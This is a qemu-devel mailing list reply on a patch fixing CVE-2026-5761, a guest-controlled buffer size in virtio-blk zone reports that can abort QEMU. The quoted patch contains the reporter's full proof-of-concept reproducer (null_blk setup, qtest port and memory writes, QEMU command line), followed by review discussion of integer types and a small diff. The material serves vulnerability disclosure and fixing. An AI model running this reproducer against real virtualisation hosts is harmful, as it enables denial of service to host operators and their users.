Return-Path: <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from lists.gnu.org (lists1p.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 87B9BF44844
	for <qemu-devel@archiver.kernel.org>; Fri, 10 Apr 2026 12:02:42 +0000 (UTC)
Received: from localhost ([::1] helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces@nongnu.org>)
	id 1wBAYt-0005Pi-Qz; Fri, 10 Apr 2026 08:02:11 -0400
Received: from eggs.gnu.org ([2001:470:142:3::10])
 by lists1p.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <stefanha@redhat.com>)
 id 1wBAYr-0005JP-MW
 for qemu-devel@nongnu.org; Fri, 10 Apr 2026 08:02:09 -0400
Received: from us-smtp-delivery-124.mimecast.com ([170.10.129.124])
 by eggs.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <stefanha@redhat.com>)
 id 1wBAYo-0005AZ-Nn
 for qemu-devel@nongnu.org; Fri, 10 Apr 2026 08:02:09 -0400
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
 s=mimecast20190719; t=1775822525;
 h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
 in-reply-to:in-reply-to:references:references;
 bh=YcwUlNTLg8meN835NcvInFasrq51Nb4EJ+AHGuTr3XE=;
 b=b3TtpUs4GawvaFzuXb76Ducz4iOt2UnyZl4kOl1n9qj5mGFn6Rhpy6K2DGEjWrOd0VHaqH
 mFt4kWnGrJkAAp9d5vbLtq9mrY6LvRw/xWk6RjZVYPVpQxQob1EfR3xMAwVGYJbNtxhswR
 Mo9YcL95PYahVpAi9bTYeqk9RE4yyao=
Received: from mx-prod-mc-06.mail-002.prod.us-west-2.aws.redhat.com
 (ec2-35-165-154-97.us-west-2.compute.amazonaws.com [35.165.154.97]) by
 relay.mimecast.com with ESMTP with STARTTLS (version=TLSv1.3,
 cipher=TLS_AES_256_GCM_SHA384) id us-mta-671-UOhkKfTyMUWEeLf5ESUjmQ-1; Fri,
 10 Apr 2026 08:02:00 -0400
X-MC-Unique: UOhkKfTyMUWEeLf5ESUjmQ-1
X-Mimecast-MFC-AGG-ID: UOhkKfTyMUWEeLf5ESUjmQ_1775822518
Received: from mx-prod-int-03.mail-002.prod.us-west-2.aws.redhat.com
 (mx-prod-int-03.mail-002.prod.us-west-2.aws.redhat.com [10.30.177.12])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by mx-prod-mc-06.mail-002.prod.us-west-2.aws.redhat.com (Postfix) with ESMTPS
 id A96F118011FF; Fri, 10 Apr 2026 12:01:57 +0000 (UTC)
Received: from localhost (unknown [10.44.33.180])
 by mx-prod-int-03.mail-002.prod.us-west-2.aws.redhat.com (Postfix) with ESMTP
 id 06DFA1955E91; Fri, 10 Apr 2026 12:01:55 +0000 (UTC)
Date: Fri, 10 Apr 2026 08:01:53 -0400
From: Stefan Hajnoczi <stefanha@redhat.com>
To: Damien Le Moal <dlemoal@kernel.org>
Cc: qemu-devel@nongnu.org, Hanna Reitz <hreitz@redhat.com>,
 qemu-stable@nongnu.org, qemu-block@nongnu.org,
 Kevin Wolf <kwolf@redhat.com>, Peter Maydell <peter.maydell@linaro.org>,
 "Michael S. Tsirkin" <mst@redhat.com>, Sam Li <faithilikerun@gmail.com>,
 Dmitry Fomichev <dmitry.fomichev@wdc.com>,
 Mingyuan Luo <myluo24@m.fudan.edu.cn>
Subject: Re: [PATCH for-11.0] virtio-blk: fix zone report buffer
 out-of-memory (CVE-2026-5761)
Message-ID: <20260410120153.GA481491@fedora>
References: <20260409200749.458162-1-stefanha@redhat.com>
 <878d1716-230f-4bcf-9806-1076c19246b7@kernel.org>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
 protocol="application/pgp-signature"; boundary="JulgWeMwUqY2q9Ty"
Content-Disposition: inline
In-Reply-To: <878d1716-230f-4bcf-9806-1076c19246b7@kernel.org>
X-Scanned-By: MIMEDefang 3.0 on 10.30.177.12
Received-SPF: pass client-ip=170.10.129.124; envelope-from=stefanha@redhat.com;
 helo=us-smtp-delivery-124.mimecast.com
X-Spam_score_int: -25
X-Spam_score: -2.6
X-Spam_bar: --
X-Spam_report: (-2.6 / 5.0 requ) BAYES_00=-1.9, DKIMWL_WL_HIGH=-0.54,
 DKIM_SIGNED=0.1, DKIM_VALID=-0.1, DKIM_VALID_AU=-0.1, DKIM_VALID_EF=-0.1,
 RCVD_IN_DNSWL_NONE=-0.0001, RCVD_IN_MSPIKE_H4=0.001, RCVD_IN_MSPIKE_WL=0.001,
 RCVD_IN_VALIDITY_RPBL_BLOCKED=0.001, RCVD_IN_VALIDITY_SAFE_BLOCKED=0.001,
 SPF_HELO_PASS=-0.001, SPF_PASS=-0.001 autolearn=unavailable autolearn_force=no
X-Spam_action: no action
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: qemu development <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org


--JulgWeMwUqY2q9Ty
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

On Fri, Apr 10, 2026 at 05:58:53AM +0200, Damien Le Moal wrote:
> On 2026/04/09 22:07, Stefan Hajnoczi wrote:
> > An internal buffer is used when processing VIRTIO_BLK_T_ZONE_REPORT
> > requests. The buffer's size is controlled by the guest. A large value
> > can result in g_malloc() failure and the QEMU process aborts, resulting
> > in a Denial of Service (DoS) (most likely in cases where an untrusted
> > guest application or a nested guest with virtio-blk passthrough is able
> > to abort QEMU).
> >=20
> > Modify the zone report implementation to work incrementally with a
> > bounded buffer size.
> >=20
> > This is purely a QEMU implementation issue and no VIRTIO spec changes
> > are needed.
> >=20
> > Mingyuan Luo found this bug and provided a reproducer which I haven't
> > put into tests/qtest/ because it requires a zoned storage device (e.g.
> > root and modprobe null_blk):
> >=20
> > 1) Prepare a zoned nullblk backend (/dev/nullb0):
> >=20
> > sudo modprobe -r null_blk || true
> > sudo modprobe null_blk nr_devices=3D1 zoned=3D1
> > sudo chmod 0666 /dev/nullb0
> > cat /sys/block/nullb0/queue/zoned
> >=20
> > 2) Create qtest input:
> >=20
> > cat >/tmp/vblk-zone-report-oom.qtest <<'EOF'
> > outl 0xcf8 0x80002004
> > outw 0xcfc 0x0007
> > outl 0xcf8 0x80002010
> > outl 0xcfc 0x0000c001
> > outb 0xc012 0x00
> > outb 0xc012 0x01
> > outb 0xc012 0x03
> > outl 0xc004 0x00000000
> > outw 0xc00e 0x0000
> > outl 0xc008 0x00000100
> > outb 0xc012 0x07
> > writel 0x00020000 0x00000010
> > writel 0x00020004 0x00000000
> > writeq 0x00020008 0x0000000000000000
> > writeq 0x00100000 0x0000000000020000
> > writel 0x00100008 0x00000010
> > writew 0x0010000c 0x0001
> > writew 0x0010000e 0x0001
> > EOF
> >=20
> > for i in $(seq 1 1022); do
> > d=3D$((0x00100000 + i * 16))
> > n=3D$((i + 1))
> > printf 'writeq 0x%08x 0x0000000000200000\n' "$d" >> /tmp/vblk-zone-repo=
rt-oom.qtest
> > printf 'writel 0x%08x 0x1fe00000\n' $((d + 8)) >> /tmp/vblk-zone-report=
-oom.qtest
> > printf 'writew 0x%08x 0x0003\n' $((d + 12)) >> /tmp/vblk-zone-report-oo=
m.qtest
> > printf 'writew 0x%08x 0x%04x\n' $((d + 14)) "$n" >> /tmp/vblk-zone-repo=
rt-oom.qtest
> > done
> >=20
> > d=3D$((0x00100000 + 1023 * 16))
> > printf 'writeq 0x%08x 0x0000000000200000\n' "$d" >> /tmp/vblk-zone-repo=
rt-oom.qtest
> > printf 'writel 0x%08x 0x1fe00000\n' $((d + 8)) >> /tmp/vblk-zone-report=
-oom.qtest
> > printf 'writew 0x%08x 0x0002\n' $((d + 12)) >> /tmp/vblk-zone-report-oo=
m.qtest
> > printf 'writew 0x%08x 0x0000\n' $((d + 14)) >> /tmp/vblk-zone-report-oo=
m.qtest
> > cat >> /tmp/vblk-zone-report-oom.qtest <<'EOF'
> > writew 0x00104000 0x0000
> > writew 0x00104002 0x0001
> > writew 0x00104004 0x0000
> > outw 0xc010 0x0000
> > EOF
> >=20
> > 3) Run the qtest input with ASAN build (compile qemu with --enable-asan=
):
> >=20
> > build/qemu-system-x86_64 -display none \
> > -accel qtest -qtest stdio \
> > -machine pc -nodefaults -m 512M -monitor none -serial none \
> > -blockdev driver=3Dhost_device,node-name=3Ddisk0,filename=3D/dev/nullb0=
 \
> > -device virtio-blk-pci-transitional,drive=3Ddisk0,addr=3D04.0,queue-siz=
e=3D1024 \
> > < /tmp/vblk-zone-report-oom.qtest
> >=20
> > Cc: Sam Li <faithilikerun@gmail.com>
> > Cc: Damien Le Moal <dlemoal@kernel.org>
> > Cc: Dmitry Fomichev <dmitry.fomichev@wdc.com>
> > Fixes: CVE-2026-5761
> > Fixes: 4f7366506a9 ("virtio-blk: add zoned storage emulation for zoned =
devices")
> > Reported-by: Mingyuan Luo <myluo24@m.fudan.edu.cn>
> > Signed-off-by: Stefan Hajnoczi <stefanha@redhat.com>
>=20
> Overall, looks OK to me, modulo one nit below.
>=20
> With that fixed, feel free to add:
>=20
> Reviewed-by: Damien Le Moal <dlemoal@kernel.org>
>=20
> [...]
>=20
> > @@ -529,28 +538,18 @@ static void virtio_blk_zone_report_complete(void =
*opaque, int ret)
> >          goto out;
> >      }
> > =20
> > -    zrp_size =3D sizeof(struct virtio_blk_zone_report)
> > -               + sizeof(struct virtio_blk_zone_descriptor) * nz;
> > -    n =3D iov_from_buf(in_iov, in_num, 0, &zrp_hdr, sizeof(zrp_hdr));
> > -    if (n !=3D sizeof(zrp_hdr)) {
> > -        virtio_error(vdev, "Driver provided input buffer that is too s=
mall!");
> > -        err_status =3D VIRTIO_BLK_S_ZONE_INVALID_CMD;
> > -        goto out;
> > -    }
> > -
> > -    for (size_t i =3D sizeof(zrp_hdr); i < zrp_size;
> > -        i +=3D sizeof(struct virtio_blk_zone_descriptor), ++j) {
> > +    for (size_t j =3D 0; j < nz; j++) {
>=20
> nz is an int64_t, so signed, but j is an unsigned size_t. This can genera=
te
> compiler/code checker warnings.

Hi Damien,
Thanks for the review! blk_aio_report_zones() takes an unsigned int
*nr_zones in/out argument and that's also the type of the
ZoneReportData->nr_zones field that nz is initialized from. So I ended
up changing both nz and j's types to unsigned since that is ultimately
the type that blk_aio_report_zones() uses. The int64_t range wasn't
actually being used and size_t wasn't necessary since the value is
capped by nz.

I will send a v2 with the following change on top:

diff --git i/hw/block/virtio-blk.c w/hw/block/virtio-blk.c
index 7fd883320a..9cb9f1fb2b 100644
--- i/hw/block/virtio-blk.c
+++ w/hw/block/virtio-blk.c
@@ -528,7 +528,7 @@ static void virtio_blk_zone_report_complete(void *opaqu=
e, int ret)
     struct iovec *in_iov =3D data->in_iov;
     unsigned in_num =3D data->in_num;
     int64_t n;
-    int64_t nz =3D zrd->nr_zones;
+    unsigned nz =3D zrd->nr_zones;
     int8_t err_status =3D VIRTIO_BLK_S_OK;
     struct virtio_blk_zone_report zrp_hdr =3D {};

@@ -538,7 +538,7 @@ static void virtio_blk_zone_report_complete(void *opaqu=
e, int ret)
         goto out;
     }

-    for (size_t j =3D 0; j < nz; j++) {
+    for (unsigned j =3D 0; j < nz; j++) {
         struct virtio_blk_zone_descriptor desc =3D
             (struct virtio_blk_zone_descriptor) {
                 .z_start =3D cpu_to_le64(zrd->zones[j].start

--JulgWeMwUqY2q9Ty
Content-Type: application/pgp-signature; name=signature.asc

-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEhpWov9P5fNqsNXdanKSrs4Grc8gFAmnY5rEACgkQnKSrs4Gr
c8jabggAwzuY1zzNkZ0Gc6XC9/v5OVqwTSbRKxSGPaE1/+MCraIzRD6o/Co8Ucwh
GRtqjMGT0b6+JIVc0YcdUMFMY/WgS9CVN7Gltqv1J2TEXc+mqe2POMv/x55yWUqr
SAZACVmFYc54f1Jg7sG++VK1PLU/gyEopsaURU8WdUMk576+c41OfGOZd1uRADhV
5mq9euePWUhn0NuquC1TnGAB570o2T7BfBOXna9sWjx/p7kP2Opeae43SwXJb30P
RQAXHYMqCOI+M1/YwUnapur+guho4kYVN0OZ4rZh590tcWpgEHaz2OaCgkMlC9Rf
cgWWqiFa/99oge19atRsaoeZDgMUvg==
=13v0
-----END PGP SIGNATURE-----

--JulgWeMwUqY2q9Ty--


